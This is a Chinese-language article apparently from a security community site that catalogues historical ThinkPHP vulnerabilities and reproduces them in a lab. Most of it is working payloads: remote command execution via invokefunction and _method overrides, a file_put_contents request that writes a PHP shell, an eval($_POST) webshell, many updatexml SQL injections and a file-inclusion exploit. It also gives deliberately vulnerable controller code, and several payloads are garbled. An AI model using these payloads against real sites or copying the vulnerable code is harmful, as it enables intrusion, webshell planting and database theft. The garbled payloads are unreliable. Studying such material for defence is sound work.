> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [zone.secevery.com](http://zone.secevery.com/article/1165)

ThinkPHP 是一个快速、简单的基于 MVC 和面向对象的轻量级 PHP 开发框架，遵循 Apache2 开源协议发布。ThinkPHP 从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重开发体验和易用性，为 WEB 应用和 API 开发提供了强有力的支持。

  **0x00 前言**  
本篇文章将针对 ThinkPHP 的历史漏洞进行整理复现，今后爆出的 ThinkPHP 漏洞，也将进行补充更新。

  **0x01ThinkPHP 远程命令执行 / 代码执行漏洞**

  **一，ThinkPHP 5.0.23 远程代码执行**  
**漏洞介绍**  
2019 年 1 月 11 日，360CERT 发现某安全社区出现关于 ThinkPHP5 RCE 漏洞的威胁情报，不久之后 ThinkPHP5 官方与 GitHub 发布更新。该更新修复了一处严重漏洞，该漏洞可导致远程命令代码执行。  
Thinkphp 在实现框架中的核心类 Request 的 method 方法实现了表单请求伪装。但由于对 $_POST[‘_method’] 属性校验不严格，导致攻击者可以通过变量覆盖掉 Request 类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。

  **影响版本**  
THINKPHP 5.0.x-5.0.23

  **漏洞分析参考：**  
https://www.freebuf.com/vuls/194093.html

  **漏洞复现（内网环境）**  
访问 192.168.10.53，选择对应版本  
需要目标开启 debug 模式

  **Poc/exp:**  
设置 url 参数 s=captcha，post 数据

```
_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami
```

[![](http://zone.secevery.com/uploads/article/20191220/02b59cfc58d675df0a9e6a6504b4ecf4.png)](http://zone.secevery.com/uploads/article/20191220/02b59cfc58d675df0a9e6a6504b4ecf4.png)

  **二，ThinkPHP 5.0.22 远程代码执行**  
**漏洞介绍**  
2018 年 12 月 9 日，ThinkPHP 官方发布安全更新，修复一处由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的 getshell 漏洞，受影响的版本包括 5.0 和 5.1 版本，山石网科安服团队经过分析，把该漏洞危险级别定为严重。  
Thinkphp5.x 版本 (5.0.20) 中没有对路由中的控制器进行严格过滤，在存在 admin、index 模块、没有开启强制路由的条件下（默认不开启），导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，完成远程代码执行

  **影响版本**  
THINKPHP 5.0.5-5.0.22  
THINKPHP 5.1.0-5.1.30

  **漏洞分析参考：**  
https://www.secpulse.com/archives/93903.html

  **漏洞复现（内网环境）**  
访问 192.168.10.53，选择对应版本

  **命令执行 payload：**

```
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1]=whoami
```

[![](http://zone.secevery.com/uploads/article/20191220/9c57d647e53818df70f04dc7d339e8ff.png)](http://zone.secevery.com/uploads/article/20191220/9c57d647e53818df70f04dc7d339e8ff.png)

**代码执行查看 phpinfo**

```
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1]=-1
```

[![](http://zone.secevery.com/uploads/article/20191220/de597a9131929fca7e8cd4c6cca44576.png)](http://zone.secevery.com/uploads/article/20191220/de597a9131929fca7e8cd4c6cca44576.png)

**写文件 payload**

```
?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell1.php&vars[1][]=<?php phpinfo();?>
```

[![](http://zone.secevery.com/uploads/article/20191220/a4180480316757a4e222fb666b755f9e.png)](http://zone.secevery.com/uploads/article/20191220/a4180480316757a4e222fb666b755f9e.png)

  **三，​ThinkPHP 2.2 任意代码执行**  
**影响版本**  
THINKPHP 2.x-2.2

**漏洞复现（内网环境）**  
访问 192.168.10.53，选择对应版本

  **Poc/exp:**

```
/module/action/param1/${phpinfo()}

/module/action/param1/${eval($_POST[1])}                           

?s=/abc/abc/abc/${THINK_VERSION}
```

[![](http://zone.secevery.com/uploads/article/20191220/87fe7fd2082ba68d27b7353f44e5aa87.png)](http://zone.secevery.com/uploads/article/20191220/87fe7fd2082ba68d27b7353f44e5aa87.png)

  **getshell 菜刀直接连接构造的连接**

[![](http://zone.secevery.com/uploads/article/20191220/813d568f9483ae9fbc84e83b17eeea81.png)](http://zone.secevery.com/uploads/article/20191220/813d568f9483ae9fbc84e83b17eeea81.png)

[![](http://zone.secevery.com/uploads/article/20191220/2cfe2ea95acd80d4783a66dfcf2b097c.png)](http://zone.secevery.com/uploads/article/20191220/2cfe2ea95acd80d4783a66dfcf2b097c.png)

**0x02ThinkPHP sql 注入漏洞**

  **一，ThinkPHP 3.2.3/5.1.22 order by 注入**  
**漏洞介绍：**  
该漏洞是因为未正确处理所接收数组类型参数的 key，直接拼接到了 SQL 语句的 order by 后面，导致漏洞的产生。该漏洞可以获取数据库数据，比如用户账号密码，管理后台账号密码，交易数据等。漏洞危害为高危。

  **影响版本**  
5.1.16<=ThinkPHP<=5.1.22，<=3.2.3

  **漏洞分析参考：**  
https://nosec.org/home/detail/1821.html

  **漏洞复现（内网环境）**  
**在 / application/index/controller / 文件夹下建立 Index.php 文件，内容如下：**

```
<?php

namespace app\index\controller;

class Index{

    public function index()    {

           $data=array();

         $data['username']=array('eq','admin');

        $order=input('get.orderby/a');

        $m=db('user')->where($data)->order($order)->find();

        Sdump($m);

   }

}

?>
```

**访问 192.168.10.53，选择对应版本**

  **Poc/exp:**  
**3.2.3**

```
?order[updatexml(1,concat(0x3a,user()),1)]=1            
```

**5.1.22** 

```
?orderby[id`|updatexml(1,concat(0x3a,user()),1)%23]=1
```

[![](http://zone.secevery.com/uploads/article/20191220/9fd040e70625857a925760814c5cfd88.png)](http://zone.secevery.com/uploads/article/20191220/9fd040e70625857a925760814c5cfd88.png)

**二，Thinkphp3.2.3 find/select/delete 注入**  
**影响版本**  
Thinkphp<=3.2.3

**漏洞分析参考：**  
https://www.anquanke.com/post/id/157817

  **漏洞复现（内网环境）**  
**在 Application\Home\Controller\IndexController.class.php 添加以下代码:**

```
<?php 

public function test()  

{  

    $id = i('id');  

    $res = M('user')‐>find($id);

    //find()  //$res = M('user')‐>delete($id); //delete() 

    //$res = M('user')‐>select($id); //select()  

}
```

**Poc/exp:**  
针对 **select()** 和 **find()** 方法 , 有很多地方可注，这里主要列举三个 table，alias， where，更多还请自行跟踪一下 parseSql 的各个 parseXXX 方法，目测都是可行 的，比如 having,group 等。  
**where:** 

```
http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat x7e,user(),0x7e),1)‐‐
```

**alias:** 

```
http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[alias]=where%201%20and%20updatexml(1,concat(0x7e,u ser(),0x7e),1)‐‐
```

**table:**

```
http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
```

[![](http://zone.secevery.com/uploads/article/20191220/47e943cd1acba4c95e82471c038eea80.png)](http://zone.secevery.com/uploads/article/20191220/47e943cd1acba4c95e82471c038eea80.png)

而 **delete()** 方法的话同样，这里粗略举三个例子，table,alias,where，但使用 table 和 alias 的时候，同时还必须保证 where 不为空

**where:** 

```
http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
```

**alias:** 

```
http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐
```

**table:** 

```
http://192.168.10.53/web/3.2.3/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat x7e,user(),0x7e),1)‐‐&id[where]=1
```

[![](http://zone.secevery.com/uploads/article/20191220/50ff54ea3e1a44f4be2dfba634b82aaf.png)](http://zone.secevery.com/uploads/article/20191220/50ff54ea3e1a44f4be2dfba634b82aaf.png)

  **三，ThinkPHP 框架 3.2.3 update 注入漏洞**  
**影响版本**  
Thinkphp<=3.2.3

  **漏洞分析参考：**  
https://www.seebug.org/vuldb/ssvid-97234

  **漏洞复现（内网环境）**  
**在 Application/Home/Controller/UserController.class.php 添加以下代码:**

```
<?php



namespace Home\Controller;

use Think\Controller;



class UserController extends Controller {



    public function index(){



        $User = M("user");

        $user['id'] = I('id');

        $data['name'] = I('name');

        $data['pass'] = I('pass');

        $valu = $User->where($user)->save($data);

        var_dump($valu);

    }

}
```

**Poc/exp:**

```
/index.php/home/user?name=1123&pass=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
```

[![](http://zone.secevery.com/uploads/article/20191220/d1cc9e98eaec43f46e0f6b13113349f5.png)](http://zone.secevery.com/uploads/article/20191220/d1cc9e98eaec43f46e0f6b13113349f5.png)

  **四，ThinkPHP 5.1.7 update 注入**  
**漏洞介绍**  
本次漏洞存在于 Mysql 类的 parseArrayData 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL 注入漏洞 的产生。

  **影响版本**  
5.1.6<=Thinkphp<=5.1.7(非最新的 5.1.8 版本也可利用)

  **漏洞分析参考：**  
https://www.freebuf.com/column/206233.html

  **漏洞复现（内网环境）**  
**在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**

```
class index

{

    public function indx()

    {

        $password=input('get.pass/a');

        db('user')->where(['id'=>1]->update(['pass'=>&password]));

    }

}
```

**Poc/exp:**

```
/index.php?pass[0]=inc&pass[1]=updatexml(2,concat(0x7e,user()),0)&pass[2]=1
```

[![](http://zone.secevery.com/uploads/article/20191220/d53c716a02ce8753e3e1513915ad17fa.png)](http://zone.secevery.com/uploads/article/20191220/d53c716a02ce8753e3e1513915ad17fa.png)

  **五，ThinkPHP 5.0.15 insert 注入**  
**漏洞介绍**  
本次漏洞存在于 Builder 类的 parseData 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL 注入漏洞 的产生。

  **影响版本**  
5.0.13<Thinkphp<=5.0.15，5.1.0<=thinkphp<=5.1.5

  **漏洞分析参考：**  
https://www.freebuf.com/column/205976.html

  **漏洞复现（内网环境）**  
**在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**

```
class Index

{

    public function index()

    {

        $username = request()->get('name/a');

        db('user')->insert(['name' => $name]);

        return 'Update success';

    }

}
```

**Poc/exp:**

```
/index/index/index?name[0]=inc&name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&name[2]=1
```

[![](http://zone.secevery.com/uploads/article/20191220/ea842a59a0b267116f44988731990116.png)](http://zone.secevery.com/uploads/article/20191220/ea842a59a0b267116f44988731990116.png)

  **六，ThinkPHP5 select 注入**  
**漏洞介绍**  
本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL 注入漏洞 的产生。

  **影响版本**  
ThinkPHP5 全版本

  **漏洞分析参考：**  
https://www.freebuf.com/column/206387.html

  **漏洞复现（内网环境**）  
**在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**

```
class Index

{

    public function index()

    {

        $name = request()->get('name');

        $result = db('user')->where('name','exp',$name)->select();

        return 'select success';

    }

}
```

**Poc/exp:**

```
/index/index/index?name=) union select updatexml(1,concat(0x7,user(),0x7e),1)#
```

[![](http://zone.secevery.com/uploads/article/20191220/a3625cb2e2543725301af1de996438c4.png)](http://zone.secevery.com/uploads/article/20191220/a3625cb2e2543725301af1de996438c4.png)

  **七，ThinkPHP5.0.10 select 注入**  
**漏洞介绍**  
本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句。再一个， Request 类的 filterValue 方法漏过滤 NOT LIKE 关键字，最终导致 SQL 注入漏洞 的产生。

  **影响版本**  
ThinkPHP 5.0.10

  **漏洞分析参考：**  
https://www.freebuf.com/column/206599.html

  **漏洞复现（内网环境）**  
**在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**

```
class Index

{

    public function index()

    {

        $username = request()->get('name/a');

        $result = db('user')->where(['name' => $name])->select();

        var_dump($result);

    }

}
```

**Poc/exp:**

```
/index/index/index?name[0]=not like&name[1][0]=%%&name[1][1]=233&name[2]=) union select 1,user()#
```

[![](http://zone.secevery.com/uploads/article/20191220/d48c037742188d28c9e2f29a0b788763.png)](http://zone.secevery.com/uploads/article/20191220/d48c037742188d28c9e2f29a0b788763.png)

  **八，ThinkPHP Mysql 聚合函数相关方法注入  
漏洞介绍**  
本次漏洞存在于所有 Mysql 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL 注入漏洞 的产生。

  **影响版本**   
5.0.0<=ThinkPHP<=5.0.21 、 5.1.3<=ThinkPHP5<=5.1.25 。

  **漏洞分析参考：**  
https://www.freebuf.com/column/206599.html

  **漏洞复现（内网环境）**  
**在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**

```
class Index

{

    public function index()

    {

        $options = request()->get('options');

        $result = db('user')->max($options);

        var_dump($result);

    }

}
```

**Poc/exp:**  
不同版本 payload 需稍作调整  
**5.0.0~5.0.21 、 5.1.3～5.1.10：**

```
/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from user%23
```

**5.1.11～5.1.25：**

```
/index/index/index?options=id)%2bupdatexml(1,concat(0×7,user(),0x7e),1) from user%23`
```

[![](http://zone.secevery.com/uploads/article/20191220/939d6f3e1692fbbf6c6cc00a6a427fe0.png)](http://zone.secevery.com/uploads/article/20191220/939d6f3e1692fbbf6c6cc00a6a427fe0.png)

  **0x03ThinkPHP 文件包含漏洞**

  **一，ThinkPHP5 文件包含漏洞**  
**漏洞介绍**  
本次漏洞存在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致文件包含漏洞的产生。

  **影响版本**   
5.0.0<=ThinkPHP5<=5.0.18、5.1.0<=ThinkPHP<=5.1.10

  **漏洞分析参考：**  
https://www.freebuf.com/column/207878.html

  **漏洞复现（内网环境）**  
**在 \ thinkphp\application\index\controller\Index.php 添加以下代码:**

```
class Index

{

     public function index()

    {

        $this->assign(request()->get());

        return $this->fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html

    }

}
```

创建 application/index/view/index/index.html 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 1.jpg 放至 public 目录下（模拟上传图片操作）。

  **Poc/exp:**

```
/index.php/index/index/index?cacheFile=1.jpg
```

[![](http://zone.secevery.com/uploads/article/20191220/d64a5375a5cd1a80f664f314ae7984aa.png)](http://zone.secevery.com/uploads/article/20191220/d64a5375a5cd1a80f664f314ae7984aa.png)